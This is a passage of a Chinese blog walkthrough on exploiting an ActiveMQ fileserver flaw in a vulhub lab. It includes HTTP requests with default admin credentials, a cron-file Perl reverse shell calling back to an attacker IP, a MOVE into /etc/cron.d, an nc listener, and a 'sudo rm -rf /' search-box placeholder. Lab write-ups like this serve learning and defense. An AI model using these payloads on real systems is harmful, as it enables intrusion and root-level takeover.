class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://1774-0c4e2302-81dd-47b3-b00a-4f026f54df7d.do-not-trust.hacking.run/</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>同样，Response报文状态码204表示移动成功：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594898264-29.png" alt="Image"></p>
+<p>5、连接webshell</p>
+<p>这里用蚁剑演示一下，<strong>重点是记住admin应用是需要登录的，所以记得一定要在连接中添加Authorization头</strong>。</p>
+<p>基础配置：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594920183-31.png" alt="Image"></p>
+<p>请求信息：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594937005-33.png" alt="Image"></p>
+<h3 id="途径3：写入cron拿反弹shell"><a href="#途径3：写入cron拿反弹shell" class="headerlink" title="途径3：写入cron拿反弹shell"></a><strong>途径3：写入cron拿反弹shell</strong></h3><p>前提条件</p>
+<blockquote>
+<p>需要运行ActiveMQ的用户有root权限</p>
+<p>服务器开启了cron服务</p>
+<p>运行ActiveMQ的用户有使用crontab的权限</p>
+</blockquote>
+<p>前两点在知识拓展中已经被证明满足了，而第3点在默认情况下是满足的，除非存在cron.allow或者cron.deny文件，但这两个文件在vulhub提供的漏洞环境中并不存在。因此本环境理论上可以通过写入cron拿反弹shell。</p>
+<p>思路分析</p>
+<p>这种方法思路就比较简单了：</p>
+<blockquote>
+<p>上传cron文件到fileserver</p>
+<p>把cron文件从fileserver转移到&#x2F;etc&#x2F;cron.d&#x2F;ele</p>
+<p>攻击机上开启监听并等待反弹shell连接</p>
+</blockquote>
+<p>这个网页有反弹shell合集，可以参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/247967.html">反弹shell的方法总结</a></p>
+<p><strong>需要注意以下三点</strong>：</p>
+<blockquote>
+<p>首先是vulhub提示的cron配置文件中换行一定要\n，不能是\r\n，否则crontab执行会失败。这一点在下面的漏洞利用过程中没有体会到。</p>
+<p>另外，&#x2F;etc&#x2F;cron.d 文件夹中的任务文件命名有特殊要求，只能使用 [\w-] 字符，不能有 . （<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_13886444/2317402">&#x2F;etc&#x2F;cron.d 攻略</a>）</p>
+<p>vulhub提供的示例中反弹shell用的是perl shell，这个反弹shell能成功的前提是服务器上安装了perl，另外，是否需要知道perl的绝对路径要看运气（看服务器上是否有相关的软链接）。</p>
+<p>测试过程中我也尝试了cron文件中写bash反弹shell，但是反弹shell没有执行成功，目前还不知道是什么原因。网上搜索cron反弹shell的资料时，发现有人在其他环境上尝试bash反弹shell也没成功。。</p>
+</blockquote>
+<p>利用步骤</p>
+<p>1、上传cron文件到fileserver</p>
+<p>payload如下，需要修改Host头</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=1afx396fq4o7818mkoe7sa03x1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://1774-0c4e2302-81dd-47b3-b00a-4f026f54df7d.do-not-trust.hacking.run/</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>243</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * root perl -e &#x27;use Socket;$i=&quot;192.168.108.129</span><br><span class="line">&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>请求数据部分是cron文件格式的perl反弹shell，*&#x2F;1 * * * *表示定时任务执行时间是每分钟一次，root表示执行定时任务的用户，后面就是perl反弹shell的内容了。万一服务器上没有perl的软链接，就需要写perl的绝对路径了，比如&#x2F;usr&#x2F;bin&#x2F;perl</p>
+<p>此外还要注意，反弹shell中的$i为攻击机ip，$p为攻击机监听的端口。</p>
+<p>Response报文状态码204表示文件上传成功</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715595002379-35.png" alt="Image"></p>
+<p>2、 将GET改为MOVE方式，把它移动到&#x2F;etc&#x2F;cron.d&#x2F;root目录下,路径为Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/ele.txt HTTP/2</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br><span class="line">Host: 1774-0c4e2302-81dd-47b3-b00a-4f026f54df7d.do-not-trust.hacking.run</span><br><span class="line">Cookie: JSESSIONID=1afx396fq4o7818mkoe7sa03x1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://1774-0c4e2302-81dd-47b3-b00a-4f026f54df7d.do-not-trust.hacking.run/</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>Response报文状态码204表示文件转移成功</p>
+<p>3、攻击机上开启监听并等待反弹shell连接</p>
+<p>攻击机上用nc开监听，监听7777端口，命令如下：</p>
+<p>nc -l -p 7777</p>
+<p>耐心等一会儿，就能连上服务器了</p>
+
+  </article>
+  <div id="paginator">
+    
+  
+  </div>
+<head>
+    <script src='/js/Valine.min.js'></script>
+  </head>
+  <body>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'FLEvpheUdzYALN4BFt0PLJtV-gzGzoHsz',
+            appKey: 'yhYts1vsbCivgo7vO1lVHyx9'
+        })
+    </script>
+  </body>
+
+  
+                        </div>
+                        <div class="col-md-4">
+                          <div class="position-sticky">
+  
+    <div class="card">
+      <form class="d-flex">
+    <div class="input-container">
+        <span class="bash-text" style="margin-bottom: 0 !important;">
+            <span class="user">user</span><span class="vm">@abd</span>:<span class="char">~</span>$
+        </span>
+        <span>
+            <input class="input" placeholder="sudo rm -rf /" type="text" id="local-search-input" required=""
+            placeholder=" " aria-label="Search">
+        </span>
+        
+
+    </div>
+</form>
+<div id="local-search-result"></div>
+    </div>
+    
+      <div class="card">
+        <div style="background-color: #0F172A;padding: 60px;text-align: center;"><img
+            src="https://ebandeng.github.io/imgs/$%7Bfiilename%7D/logo.jpg" alt=""  style="border-radius: 100%;">
+        </div>
+        <div class="card-body">
+          
+            <h5 class="card-title">
+              Hey!
+            </h5>
+            
+          <p class="card-text">
+            In the sea of coding, I am Lengux, pursuing creativity and user experience.
+          </p>
+          <p class="card-text"><small class="text-muted">
+              
+                <p id="hitokoto">
+                  <script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto"></script>
+                </p>
+                
+            </small></p>
+        </div>
+      </div>
+      
+        <div class="card cardtop">
+          <div style="background-color: #0F172A;padding:0 10px;color: #fff;"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-people-fill" viewBox="0 0 16 16">
+            <path d="M7 14s-1 0-1-1 1-4 5-4 5 3 5 4-1 1-1 1H7zm4-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
+            <path fill-rule="evenodd" d="M5.216 14A2.238 2.238 0 0 1 5 13c0-1.355.68-2.75 1.936-3.72A6.325 6.325 0 0 0 5 9c-4 0-5 3-5 4s1 1 1 1h4.216z"/>
+            <path d="M4.5 8a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5z"/>
+          </svg>&nbsp;友情链接</div>
+          <div style="padding: 10px;">
+            <div class="bottom-link">
+        
+            <a href=>
+                <span>
+                    
+                </span>
+            </a>
+            
+</div>
+          </div>
+        </div>
+        
+        
+          <div class="card cardtop">
+            <div style="background-color: #0F172A;padding:0 10px;color: #fff;"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-bookmarks" viewBox="0 0 16 16">
+              <path d="M2 4a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v11.5a.5.5 0 0 1-.777.416L7 13.101l-4.223 2.815A.5.5 0 0 1 2 15.5V4zm2-1a1 1 0 0 0-1 1v10.566l3.723-2.482a.5.5 0 0 1 .554 0L11 14.566V4a1 1 0 0 0-1-1H4z"/>
+              <path d="M4.268 1H12a1 1 0 0 1 1 1v11.768l.223.148A.5.5 0 0 0 14 13.5V2a2 2 0 0 0-2-2H6a2 2 0 0 0-1.732 1z"/>
+            </svg>&nbsp;标签</div>
+            <div style="padding: 10px;">
+              
+            </div>
+          </div>
+          
+  
+</div>
+
+
+
+
+        
+        
+         
+           
+                        </div>
+                      </div>
+                     
+                    </main>
+
+                  </div>
+                </div>
+                <div id="bottom-outer">
+  <div id="bottom-inner">
+    Made with 💛 by
+    <a href=https://github.com/XUSHAO11/lengux.git style="color:#0d6efd"> Lengux </a>
+    and some fantastic contributors! <a target="_blank" rel="noopener" href="http://hexo.io" style="color:#0d6efd">hexo blog framework</a>
+    <div><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/" style="color:#0d6efd">豫ICP备2022014432号-1</a></div>
+  </div>
+</div>
+
+  <!-- Highlight.js -->
+  <link rel="stylesheet" href="/css/github.min.css">
+  <script src="/js/highlight.min.js">
+  </script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+                  
+<svg id="toptop" xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-arrow-up-square" viewBox="0 0 16 16">
+  <path fill-rule="evenodd" d="M15 2a1 1 0 0 0-1-1H2a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V2zM0 2a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V2zm8.5 9.5a.5.5 0 0 1-1 0V5.707L5.354 7.854a.5.5 0 1 1-.708-.708l3-3a.5.5 0 0 1 .708 0l3 3a.5.5 0 0 1-.708.708L8.5 5.707V11.5z"/>
+</svg>
+<style>
+</style>
+
+        </body>
+        
+          
+            <script src="/js/bootstrap.bundle.min.js"></script>
+            
+            <script src="/js/jquery-2.0.2.min.js"></script>
+            
+            <script src="/js/lengux.js"></script>
+            
+            <script src="/js/dark.js"></script>
+            
+            <script src="/js/search.js"></script>
+            
+            <script src="/js/darkmode-js.min.js"></script>
+            
+              
+
+</html>
+
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+  </script>
